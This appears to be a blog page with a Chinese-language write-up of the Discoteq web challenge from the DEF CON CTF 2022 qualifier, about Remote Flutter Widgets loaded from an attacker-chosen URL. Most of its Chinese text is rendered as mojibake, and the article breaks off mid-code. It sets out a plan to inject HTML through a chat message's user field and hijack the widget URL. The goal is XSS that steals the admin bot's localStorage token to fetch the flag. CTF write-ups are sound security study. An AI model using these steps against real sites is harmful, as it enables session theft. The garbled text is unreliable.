<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>DEF CON CTF 2022 Qualifier ç­†è¨˜ - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


            
<link href="https://blog.huli.tw/2022/06/03/en/defcon-2022-qual-writeup/" rel="alternate" hreflang="en" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/06/03/defcon-2022-qual-writeup/">
    





    <meta name="description" content="ä»Šå¹´çš„ DEF CON CTF è³‡æ ¼è³½è·Ÿå»å¹´å·®ä¸å¤šï¼Œéƒ½æ˜¯ binary ç›¸é—œçš„é¡Œç›®å±…å¤šï¼Œè€Œä¸”ä»Šå¹´çš„éœ€è¦ä¸€å † reverse çŸ¥è­˜ï¼Œåƒæˆ‘é€™ç¨®åŸºæœ¬ä¸Šä¸æœƒ reverse çš„åªèƒ½åœ¨ä¸€æ—ç™¼å‘†å¤–åŠ å¹«éšŠå‹åŠ æ²¹ã€‚ ä¸éä»Šå¹´å”¯ä¸€çš„ web é¡Œï¼ˆå«åš Discoteqï¼‰æˆ‘å€’æ˜¯è¦ºå¾—æ»¿æœ‰è¶£çš„ï¼Œé›£åº¦ä¸é«˜ä½†æ»¿è€ƒé©— debug è·Ÿè§€å¯ŸåŠ›ä»¥åŠè¿…é€Ÿä¸Šæ‰‹ä¸€å€‹æ–°æ±è¥¿çš„èƒ½åŠ›ï¼Œæˆ‘è¦ºå¾—è€ƒçš„æ˜¯åŸºæœ¬åŠŸï¼Œè€Œä¸æ˜¯å°æŸå€‹èªè¨€æˆ–æ˜¯æ¡†æ¶çš„çŸ¥è­˜ï¼Œé€™é»">
<meta property="og:type" content="article">
<meta property="og:title" content="DEF CON CTF 2022 Qualifier ç­†è¨˜">
<meta property="og:url" content="https://blog.huli.tw/2022/06/03/defcon-2022-qual-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="ä»Šå¹´çš„ DEF CON CTF è³‡æ ¼è³½è·Ÿå»å¹´å·®ä¸å¤šï¼Œéƒ½æ˜¯ binary ç›¸é—œçš„é¡Œç›®å±…å¤šï¼Œè€Œä¸”ä»Šå¹´çš„éœ€è¦ä¸€å † reverse çŸ¥è­˜ï¼Œåƒæˆ‘é€™ç¨®åŸºæœ¬ä¸Šä¸æœƒ reverse çš„åªèƒ½åœ¨ä¸€æ—ç™¼å‘†å¤–åŠ å¹«éšŠå‹åŠ æ²¹ã€‚ ä¸éä»Šå¹´å”¯ä¸€çš„ web é¡Œï¼ˆå«åš Discoteqï¼‰æˆ‘å€’æ˜¯è¦ºå¾—æ»¿æœ‰è¶£çš„ï¼Œé›£åº¦ä¸é«˜ä½†æ»¿è€ƒé©— debug è·Ÿè§€å¯ŸåŠ›ä»¥åŠè¿…é€Ÿä¸Šæ‰‹ä¸€å€‹æ–°æ±è¥¿çš„èƒ½åŠ›ï¼Œæˆ‘è¦ºå¾—è€ƒçš„æ˜¯åŸºæœ¬åŠŸï¼Œè€Œä¸æ˜¯å°æŸå€‹èªè¨€æˆ–æ˜¯æ¡†æ¶çš„çŸ¥è­˜ï¼Œé€™é»">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/cover.png">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/p0.png">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/p1.png">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/p2.png">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/p3.png">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/p4.png">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/p5.png">
<meta property="article:published_time" content="2022-06-02T15:27:28.000Z">
<meta property="article:modified_time" content="2023-05-07T01:15:16.477Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/cover.png">



<link rel="alternative" href="/atom.xml" title="DEF CON CTF 2022 Qualifier ç­†è¨˜" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">æ–‡ç« åˆ—è¡¨</a>
            
            <a class="navbar-item "
               href="/categories">åˆ†é¡</a>
            
            <a class="navbar-item "
               href="/recommend">æ¨è–¦é–±è®€</a>
            
            <a class="navbar-item "
               href="/about">é—œæ–¼æˆ‘</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="ç›®éŒ„">
                    ç›®éŒ„
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#1740-é¡Œç›®é‡‹å‡º">1.1&nbsp;&nbsp;17:40 é¡Œç›®é‡‹å‡º</a>
                    
                    
                    
                    <a class="navbar-item" href="#17444m-é–‹å§‹çœ‹é¡Œ">1.2&nbsp;&nbsp;17:44(4m) é–‹å§‹çœ‹é¡Œ</a>
                    
                    
                    
                    <a class="navbar-item" href="#175414m-åˆæ­¥æƒ³æ³•">1.3&nbsp;&nbsp;17:54(14m) åˆæ­¥æƒ³æ³•</a>
                    
                    
                    
                    <a class="navbar-item" href="#180929m-ç™¼ç¾æ¼æ´ä»¥åŠçŒœæ¸¬å®Œæ•´æ”»æ“ŠéŠ">1.4&nbsp;&nbsp;18:09(29m) ç™¼ç¾æ¼æ´ä»¥åŠçŒœæ¸¬å®Œæ•´æ”»æ“ŠéŠ</a>
                    
                    
                    
                    <a class="navbar-item" href="#182646m-ç¹¼çºŒç ”ç©¶-source-code">1.5&nbsp;&nbsp;18:26(46m) ç¹¼çºŒç ”ç©¶ source code</a>
                    
                    
                    
                    <a class="navbar-item" href="#183555m-ç¢ºèªè¼‰å…¥æ–¹å¼">1.6&nbsp;&nbsp;18:35(55m) ç¢ºèªè¼‰å…¥æ–¹å¼</a>
                    
                    
                    
                    <a class="navbar-item" href="#19031h-23m-è§£ç¢¼-widget">1.7&nbsp;&nbsp;19:03(1h 23m) è§£ç¢¼ widget</a>
                    
                    
                    
                    <a class="navbar-item" href="#19371h-57m-å»åƒé£¯">1.8&nbsp;&nbsp;19:37(1h 57m) å»åƒé£¯</a>
                    
                    
                    
                    <a class="navbar-item" href="#20122h-32m-åƒå®Œé£¯å›ä¾†ç¹¼çºŒæˆ°é¬¥">1.9&nbsp;&nbsp;20:12(2h 32m) åƒå®Œé£¯å›ä¾†ç¹¼çºŒæˆ°é¬¥</a>
                    
                    
                    
                    <a class="navbar-item" href="#20262h-46m-æ‰¾åˆ°æ­£ç¢ºçš„æ–¹å‘">1.10&nbsp;&nbsp;20:26(2h 46m) æ‰¾åˆ°æ­£ç¢ºçš„æ–¹å‘</a>
                    
                    
                    
                    <a class="navbar-item" href="#21113h-31m-æ‰¾åˆ°æ­£ç¢ºçš„-build-æ³•">1.11&nbsp;&nbsp;21:11(3h 31m) æ‰¾åˆ°æ­£ç¢ºçš„ build æ³•</a>
                    
                    
                    
                    <a class="navbar-item" href="#21303h-50m-æœ‰å…¶ä»–éšŠä¼è§£é–‹äº†">1.12&nbsp;&nbsp;21:30(3h 50m) æœ‰å…¶ä»–éšŠä¼è§£é–‹äº†</a>
                    
                    
                    
                    <a class="navbar-item" href="#21434h-03m-æ‰¾åˆ°å…¶ä»–é—œéµ">1.13&nbsp;&nbsp;21:43(4h 03m) æ‰¾åˆ°å…¶ä»–é—œéµ</a>
                    
                    
                    
                    <a class="navbar-item" href="#22224h-42m-æˆåŠŸè§¸ç™¼-event">1.14&nbsp;&nbsp;22:22(4h 42m) æˆåŠŸè§¸ç™¼ event</a>
                    
                    
                    
                    <a class="navbar-item" href="#22565h-16m-é‡å›æ­£è»Œé–‹å§‹å¯¦ä½œ-exploit">1.15&nbsp;&nbsp;22:56(5h 16m) é‡å›æ­£è»Œï¼Œé–‹å§‹å¯¦ä½œ exploit</a>
                    
                    
                    
                    <a class="navbar-item" href="#23195h-39m-å¤±æ•—çš„-exploit">1.16&nbsp;&nbsp;23:19(5h 39m) å¤±æ•—çš„ exploit</a>
                    
                    
                    
                    <a class="navbar-item" href="#23255h-45m-è§£é–‹å›‰">1.17&nbsp;&nbsp;23:25(5h 45m) è§£é–‹å›‰ ğŸ‰</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#ç¸½çµ">2&nbsp;&nbsp;<b>ç¸½çµ</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2022/06/03/en/defcon-2022-qual-writeup/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        æœ€è¿‘é–‹äº†ä¸€å€‹è®€è€…å›é¥‹è¡¨å–®ï¼Œç„¡è«–æ˜¯å°æ–‡ç« çš„æ„Ÿæƒ³æˆ–æ˜¯å°éƒ¨è½æ ¼çš„æ„Ÿæƒ³ï¼Œæœ‰ä»€éº¼æƒ³å›é¥‹çš„éƒ½å¯ä»¥å¡«è¡¨å–®è·Ÿæˆ‘èªªï¼š<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">è¡¨å–®é€£çµ</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            DEF CON CTF 2022 Qualifier ç­†è¨˜
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-06-02T15:27:28.000Z" itemprop="datePublished">2022å¹´6æœˆ3æ—¥</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <img src="/img/defcon-2022-qual-writeup/cover.png" style="display:none">

<p>ä»Šå¹´çš„ DEF CON CTF è³‡æ ¼è³½è·Ÿå»å¹´å·®ä¸å¤šï¼Œéƒ½æ˜¯ binary ç›¸é—œçš„é¡Œç›®å±…å¤šï¼Œè€Œä¸”ä»Šå¹´çš„éœ€è¦ä¸€å † reverse çŸ¥è­˜ï¼Œåƒæˆ‘é€™ç¨®åŸºæœ¬ä¸Šä¸æœƒ reverse çš„åªèƒ½åœ¨ä¸€æ—ç™¼å‘†å¤–åŠ å¹«éšŠå‹åŠ æ²¹ã€‚</p>
<p>ä¸éä»Šå¹´å”¯ä¸€çš„ web é¡Œï¼ˆå«åš Discoteqï¼‰æˆ‘å€’æ˜¯è¦ºå¾—æ»¿æœ‰è¶£çš„ï¼Œé›£åº¦ä¸é«˜ä½†æ»¿è€ƒé©— debug è·Ÿè§€å¯ŸåŠ›ä»¥åŠè¿…é€Ÿä¸Šæ‰‹ä¸€å€‹æ–°æ±è¥¿çš„èƒ½åŠ›ï¼Œæˆ‘è¦ºå¾—è€ƒçš„æ˜¯åŸºæœ¬åŠŸï¼Œè€Œä¸æ˜¯å°æŸå€‹èªè¨€æˆ–æ˜¯æ¡†æ¶çš„çŸ¥è­˜ï¼Œé€™é»é‚„æ»¿æ£’çš„ã€‚</p>
<p>å› ç‚ºä»Šå¹´å°±åªæœ‰é€™ä¸€é¡Œå¥½å¯«ï¼Œæ›å€‹æ–¹å¼å¯«å¯«çœ‹å¥½äº†ï¼Œæˆ‘ä¾†ç…§è‘—æ™‚é–“è»¸å¯«ä¸€ä¸‹ç•¶æ™‚è§£é¡Œçš„æƒ³æ³•ï¼Œæ™‚é–“å¾Œé¢ä»£è¡¨å¾é¡Œç›®é‡‹å‡ºéäº†å¤šä¹…ã€‚</p>
<span id="more"></span>

<h3><span id="1740-é¡Œç›®é‡‹å‡º">17:40 é¡Œç›®é‡‹å‡º</span></h3><h3><span id="17444m-é–‹å§‹çœ‹é¡Œ">17:44(4m) é–‹å§‹çœ‹é¡Œ</span></h3><p>é–‹å§‹è™Ÿæ‹›éšŠå‹ä¸€èµ·ä¾†çœ‹é¡Œç›®ï¼Œæˆ‘è‡ªå·±ä¹Ÿé–‹å§‹è§€å¯Ÿäº†ä¸€ä¸‹ã€‚</p>
<p>é€™é¡Œ Discoteq åŸºæœ¬ä¸Šå°±æ˜¯ä¸€å€‹èŠå¤©çš„ç¶²ç«™ï¼Œè¨»å†Šç™»å…¥ä¹‹å¾Œå¯ä»¥ç™¼é€è¨Šæ¯ï¼Œåœ¨æ¥æ”¶è·Ÿç™¼é€è¨Šæ¯çš„éƒ¨åˆ†éƒ½æ˜¯é€é websocket ä¾†æºé€šã€‚</p>
<p><img src="/img/defcon-2022-qual-writeup/p0.png" alt="ui"></p>
<p>é™¤äº†ä¸€èˆ¬çš„æ–‡å­—è¨Šæ¯ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç™¼èµ·æŠ•ç¥¨ã€‚</p>
<p>æ¥è‘—ä¸»è¦å°±æ˜¯ç†Ÿæ‚‰ä¸€ä¸‹é€™å€‹ç¶²é åœ¨å¹¹å˜›ï¼Œç™¼ç¾æ²’å¤ªå¤šåŠŸèƒ½ä»¥å¾Œï¼Œæˆ‘å°±é–‹å§‹çœ‹èµ· source codeã€‚è©±èªªé€™é¡Œæ²’æœ‰æä¾› source codeï¼Œä½†ç•¢ç«Ÿæ˜¯å‰ç«¯å˜›ï¼Œæ‰€ä»¥å°±ç”¨ devtool åŠ æ¸›çœ‹ä¸€ä¸‹ï¼Œæ²’æœ‰å¤ªå¤šçš„æ··æ·†æˆ–æ˜¯åŠ å¯†ï¼Œæ‰€ä»¥å¯è®€æ€§é‚„æ˜¯æ»¿é«˜çš„ã€‚</p>
<h3><span id="175414m-åˆæ­¥æƒ³æ³•">17:54(14m) åˆæ­¥æƒ³æ³•</span></h3><p>é€™æ™‚å€™æˆ‘åœ¨ source code è£¡é¢ç”¨ <code>/api</code> è·Ÿ <code>/flag</code> ç•¶é—œéµå­—æ‰¾åˆ°ä¸€å€‹ API çš„ endpoint å«åš <code>POST /api/flag</code>ï¼Œå¦‚æœæ˜¯ admin èº«ä»½å°±å¯ä»¥æ‰“é€™å€‹ API æ‹¿åˆ° flagï¼Œå¾åº•ä¸‹æˆªåœ–ä¸­ä¹Ÿå¯ä»¥ç™¼ç¾ç¨‹å¼è£¡é¢æœ‰å€‹ AdminPageï¼š</p>
<p><img src="/img/defcon-2022-qual-writeup/p1.png" alt="admin page"></p>
<p>ç„¶å¾Œé€™é¡Œåˆæœ‰ä¸€å€‹ admin bot æœƒçœ‹ä½ çš„è¨Šæ¯ï¼Œæ‰€ä»¥æˆ‘æ¨æ¸¬é€™é¡Œå¯èƒ½æ˜¯è¦ XSS &#x3D;&gt; æ‹¿åˆ° admin tokenï¼ˆå­˜åœ¨ localStorageï¼‰ &#x3D;&gt; æ‰“ API æ‹¿ flagã€‚</p>
<p>ä¸éå¯¦éš›åšæ³•é‚„ä¸çŸ¥é“å¾ä½•ä¸‹æ‰‹ï¼Œç¹¼çºŒçœ‹ codeã€‚</p>
<h3><span id="180929m-ç™¼ç¾æ¼æ´ä»¥åŠçŒœæ¸¬å®Œæ•´æ”»æ“ŠéŠ">18:09(29m) ç™¼ç¾æ¼æ´ä»¥åŠçŒœæ¸¬å®Œæ•´æ”»æ“ŠéŠ</span></h3><p>ç¹¼çºŒç©äº†ä¸€é™£å­ï¼Œæ³¨æ„åˆ°ä¸€å€‹æ¼æ´ï¼Œé‚£å°±æ˜¯é€å‡ºè¨Šæ¯æ™‚çš„ JSON é•·é€™æ¨£ï¼š</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"widget"</span><span class="token punctuation">,</span>
  <span class="token property">"widget"</span><span class="token operator">:</span> <span class="token string">"/widget/chatmessage"</span><span class="token punctuation">,</span>
  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"user"</span><span class="token operator">:</span> <span class="token string">"ewfwefoenfof32of&lt;h1 a=\">test&lt;/h1#ab525155"</span><span class="token punctuation">,</span>
    <span class="token property">"platform"</span><span class="token operator">:</span> <span class="token string">"web"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"recipients"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"qdqwd"</span><span class="token punctuation">,</span>
    <span class="token string">"admin#13371337"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"message"</span><span class="token operator">:</span> <span class="token string">"hello"</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é€å‡ºè¨Šæ¯å¾Œï¼Œæœƒç™¼ç¾ç€è¦½å™¨ç™¼å‡ºä¸€å€‹ request å» <code>https://example.com/widget/chatmessage</code> æ‹¿è³‡æ–™ï¼Œresponse å¦‚ä¸‹ï¼š</p>
<p><img src="/img/defcon-2022-qual-writeup/p2.png" alt="chat message"></p>
<p>æ–‡å­—ç‰ˆï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">Ã¾RFWcorewidgetscoremateriallocalrootloaded        Containerchild    Columnchildren    Rowchildren    TexttextFrom     TexttextauthoruserstylecolorÃŠÂÃ¿    Paddingpadding@child    Texttextdatatitle
loaded    Columnchildrenpoll_options    Rowchildren    Paddingchild    ElevatedButtonchild    Texttexttext    onPressedapi_postpathdataapiVotebody    selectiontextpadding@$@    Texttextcount    
TextButtonchild    TexttextRefreshstylecolorÂÂÃ¿Ã¿    onPressedloaded        ApiMapperurldataapiGetjsonKeyoptionsdataKeypoll_optionsonLoadedloaded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>çœ‹èµ·ä¾†æ˜¯æŸç¨®ç¶“éåºåˆ—åŒ–çš„æ±è¥¿ï¼Œè€Œå¦‚æœæˆ‘æŠŠ widget çš„å…§å®¹æ”¹æˆ <code>.huli.tw/test</code>ï¼Œç€è¦½å™¨å°±æœƒå» <code>https://example.com.huli.tw/test</code> æŠ“æ±è¥¿ï¼Œå› æ­¤é€™é‚Šå¯ä»¥æ“æ§ JS è¦å»å“ªé‚Šæ‹¿é€™å€‹ç¶“éåºåˆ—åŒ–çš„æ±è¥¿ã€‚é™¤äº†ç”¨ <code>.huli.tw</code> ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨ <code>@huli.tw</code>ï¼ŒæŠŠå‰é¢è®Šæˆ username çš„ä¸€éƒ¨åˆ†ï¼Œé€™æ¨£å°±ä¸ç”¨é¡å¤–å†è¨­ä¸€å€‹ domainï¼Œæ¯”è¼ƒæ–¹ä¾¿ã€‚</p>
<p>å› æ­¤æˆ‘çŒœæ¸¬é€™é¡Œå°±æ˜¯ï¼š</p>
<ol>
<li>æ‰¾åˆ°æ€éº¼ç”¢ç”Ÿé€™å€‹ widget</li>
<li>ç”¨ widget ä¾† XSSï¼ˆä¾‹å¦‚èªªåŠ ä¸Š <code>&lt;script&gt;</code> æˆ–æ˜¯å…¶ä»– XSS payloadï¼‰</li>
<li>è®“ admin bot è¼‰å…¥ä½ çš„ widget</li>
<li>æ‹¿åˆ° admin token</li>
<li>æ‰“ API æ‹¿ flag</li>
</ol>
<p>å› æ­¤æ¥ä¸‹ä¾†å°±æ˜¯è¦å»çœ‹æ€éº¼ç”¢ç”Ÿé€™å€‹ widgetï¼Œç¹¼çºŒåœ¨ source code è£¡é¢æ‰¾è³‡æ–™ã€‚</p>
<h3><span id="182646m-ç¹¼çºŒç ”ç©¶-source-code">18:26(46m) ç¹¼çºŒç ”ç©¶ source code</span></h3><p>åœ¨åŸå§‹ç¢¼è£¡é¢ç™¼ç¾æœ‰ä¸€å€‹å«åš getChatWidget çš„å‡½å¼å°±æ˜¯æ‹¿ä¾†è¼‰å…¥ widget çš„ï¼Œä¸ééœ€è¦ä¸€é»æ™‚é–“ç ”ç©¶è£¡é¢åœ¨å¹¹å˜›ã€‚</p>
<p><img src="/img/defcon-2022-qual-writeup/p3.png" alt="getChatWidget"></p>
<h3><span id="183555m-ç¢ºèªè¼‰å…¥æ–¹å¼">18:35(55m) ç¢ºèªè¼‰å…¥æ–¹å¼</span></h3><p>æ­¤æ™‚ç¢ºèªæ˜¯ä¸€å¥—å«åš <a target="_blank" rel="noopener" href="https://github.com/flutter/packages/tree/main/packages/rfw">rfw</a> çš„æ±è¥¿ï¼Œå…¨ç¨±ç‚º Remote Flutter Widgetsã€‚é›–ç„¶èªªæ—©åœ¨æˆ‘ç™¼ç¾æ˜¯é ç«¯è¼‰å…¥å…ƒä»¶æ™‚å°±æœ‰ç”¨ Google æ‰¾åˆ°é€™ä¸€å¥—ï¼ŒéšŠå‹ä¹Ÿæœ‰æ‰¾åˆ°é€™ä¸€å¥—ï¼Œä½†ä¹‹å‰æ²’æœ‰è­‰æ“šæ‰€ä»¥ä¸æ•¢ç¢ºèªï¼Œæˆ‘æ€•æ‰¾éŒ¯æ–¹å‘ã€‚</p>
<p>ä¹‹æ‰€ä»¥å¾Œä¾†èƒ½ç¢ºèªæ˜¯å› ç‚ºé€™é‚Šçš„ç¨‹å¼ç¢¼ï¼š<a target="_blank" rel="noopener" href="https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/binary.dart#L32">https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/binary.dart#L32</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/// The first four bytes of a Remote Flutter Widgets binary library blob.</span>
<span class="token comment">///</span>
<span class="token comment">/// This signature is automatically added by [encodeLibraryBlob] and is checked</span>
<span class="token comment">/// in [decodeLibraryBlob].</span>
<span class="token comment">///</span>
<span class="token comment">/// See also:</span>
<span class="token comment">///</span>
<span class="token comment">///  * [dataBlobSignature], which is the signature for binary data blobs.</span>
<span class="token keyword">const</span> List<span class="token operator">&lt;</span>int<span class="token operator">></span> libraryBlobSignature <span class="token operator">=</span> <span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token punctuation">[</span><span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é€™å››å€‹ bytes è·Ÿå‰é¢çœ‹åˆ°çš„ remote widget å»åˆï¼Œæ‰€ä»¥ç¢ºèªæ˜¯ç”¨é€™ä¸€å¥—ç”¢ç”Ÿçš„ã€‚</p>
<p>æ¥ä¸‹ä¾†å°±æ˜¯è¦ç ”ç©¶ä¸€ä¸‹ Flutter æ€éº¼å¯«ï¼Œç„¶å¾Œçœ‹ä¸€ä¸‹æ€éº¼ç”¢ç”Ÿ widgetï¼Œç„¶å¾Œå…‰æ˜¯æŠŠ flutter SDK è£èµ·ä¾†å°±èŠ±äº†ä¸€äº›æ™‚é–“XD</p>
<h3><span id="19031h-23m-è§£ç¢¼-widget">19:03(1h 23m) è§£ç¢¼ widget</span></h3><p>å…¶å¯¦ rfw æ²’ä»€éº¼æ–‡ä»¶ï¼Œç›´æ¥çœ‹ example æ¯”è¼ƒå¿«ã€‚å¾ example è£¡é¢æ‰¾åˆ°äº†æŠŠ widget encode&#x2F;decode çš„ç¨‹å¼ç¢¼ï¼Œä¿®æ”¹ä¸€ä¸‹ä¹‹å¾Œå°±å¯ä»¥æ‹¿ä¾† decode æˆ‘å€‘çš„ <code>/widget/chatmessage</code>ï¼Œå…§å®¹æ˜¯é€™æ¨£ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">widget root <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">text</span><span class="token operator">:</span> From
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Expanded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>author<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
                    <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4278230474</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Expanded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
